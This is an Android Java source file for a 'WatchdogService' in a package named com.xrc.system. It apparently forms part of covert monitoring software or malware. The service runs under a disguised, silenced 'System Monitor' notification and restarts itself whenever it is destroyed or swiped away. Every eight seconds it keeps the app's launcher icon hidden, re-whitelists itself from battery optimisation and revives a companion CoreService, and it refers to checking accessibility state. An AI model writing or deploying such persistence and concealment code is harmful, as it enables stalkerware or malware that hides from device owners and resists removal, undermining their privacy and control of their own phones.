package com.xrc.system.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Color;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Process;
import android.util.Log;

import com.xrc.system.R;
import com.xrc.system.core.Constants;
import com.xrc.system.core.SelfHealer;
import com.xrc.system.features.AppManager;

public class WatchdogService extends Service {
    private static final String TAG = Constants.TAG + ":Watchdog";
    private static final long CHECK_INTERVAL = 8000;
    private Handler handler;
    private Runnable checkTask;

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        createNotificationChannel();
        startForegroundWithType();
        startWatchdog();
        Log.i(TAG, "Watchdog started");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        if (handler != null) handler.removeCallbacksAndMessages(null);
        Intent restart = new Intent(this, WatchdogService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restart);
        } else {
            startService(restart);
        }
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Intent restart = new Intent(this, WatchdogService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restart);
        } else {
            startService(restart);
        }
        super.onTaskRemoved(rootIntent);
    }

    private void startForegroundWithType() {
        Notification notification = buildNotification();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(Constants.NOTIF_ID_WATCHDOG, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
        } else {
            startForeground(Constants.NOTIF_ID_WATCHDOG, notification);
        }
    }

    private Notification buildNotification() {
        Intent intent = new Intent(this, com.xrc.system.ui.MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent,
                PendingIntent.FLAG_IMMUTABLE);
        return new Notification.Builder(this, Constants.CHANNEL_ID)
                .setContentTitle("System Monitor")
                .setContentText("Monitoring device health...")
                .setSmallIcon(android.R.drawable.ic_menu_compass)
                .setContentIntent(pi)
                .setOngoing(true)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    Constants.CHANNEL_ID + "_wd",
                    "Watchdog",
                    NotificationManager.IMPORTANCE_MIN);
            channel.setDescription("System watchdog monitor");
            channel.setLightColor(Color.GREEN);
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    private void startWatchdog() {
        checkTask = () -> {
            try {
                checkCoreService();
                checkAccessibility();
                checkIconHidden();
                checkBatteryWhitelist();
                checkProcessAlive();
            } catch (Exception e) {
                Log.e(TAG, "Watchdog check error", e);
            }
            handler.postDelayed(checkTask, CHECK_INTERVAL);
        };
        handler.post(checkTask);
    }

    private void checkCoreService() {
        if (!isServiceRunning(CoreService.class)) {
            Log.w(TAG, "CoreService not running — restarting");
            Intent i = new Intent(this, CoreService.class);
            i.setAction(Constants.ACTION_START_SERVICES);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(i);
            } else {
                startService(i);
            }
        }
    }

    private void checkAccessibility() {
        // Accessibility state checked by CoreService heartbeat
    }

    private void checkIconHidden() {
        AppManager.get(this).ensureIconHidden();
    }

    private void checkBatteryWhitelist() {
        AppManager.get(this).whitelistBattery();
    }

    private void checkProcessAlive() {
        // Self-check
        if (Process.myPid() <= 0) {
            SelfHealer.get(this).triggerRestart();
        }
    }

    private boolean isServiceRunning(Class<?> cls) {
        android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        if (am == null) return false;
        for (android.app.ActivityManager.RunningServiceInfo info : am.getRunningServices(Integer.MAX_VALUE)) {
            if (cls.getName().equals(info.service.getClassName())) {
                return true;
            }
        }
        return false;
    }
}
